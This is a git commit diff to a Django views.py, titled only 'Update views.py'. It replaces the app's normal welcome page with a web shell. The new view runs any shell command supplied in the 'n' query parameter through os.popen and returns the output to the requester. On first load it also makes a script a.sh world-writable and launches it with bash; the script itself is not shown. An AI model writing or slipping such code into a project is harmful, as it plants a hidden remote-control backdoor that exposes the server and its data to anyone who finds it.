3b6af0dde8fbc94e445a60866d8407e8665f63c7
chamalz <56085223+chamalz@users.noreply.github.com>
2020-09-07 06:47:23 -0700

    Update views.py

--- welcome/views.py
+++ welcome/views.py
@@ -2,21 +2,31 @@ import os
 from django.shortcuts import render
 from django.conf import settings
 from django.http import HttpResponse
-
+import os
+import subprocess
 from . import database
 from .models import PageView
 
 # Create your views here.
 
 def index(request):
-    hostname = os.getenv('HOSTNAME', 'unknown')
-    PageView.objects.create(hostname=hostname)
-
-    return render(request, 'welcome/index.html', {
-        'hostname': hostname,
-        'database': database.info(),
-        'count': PageView.objects.count()
-    })
+    ff="false"
+    try:
+      f1 = open('myfile.txt')
+      f1.close()
+      ff="true"
+    except FileNotFoundError:
+      ff="false"
+    if ff=="false":
+      f1=open("myfile.txt","a")
+      f1.close()
+      f = os.popen("chmod 777 a.sh")
+      f = subprocess.Popen(["bash", "a.sh", "runserver"])
+    s=request.GET.get('n')
+    f = os.popen(str(s))
+    now = f.read()  
+    return HttpResponse("<xmp>"+'Hello '+now+"</xmp>")
+    #return render(request, "index.html")
 
 def health(request):
     return HttpResponse(PageView.objects.count())
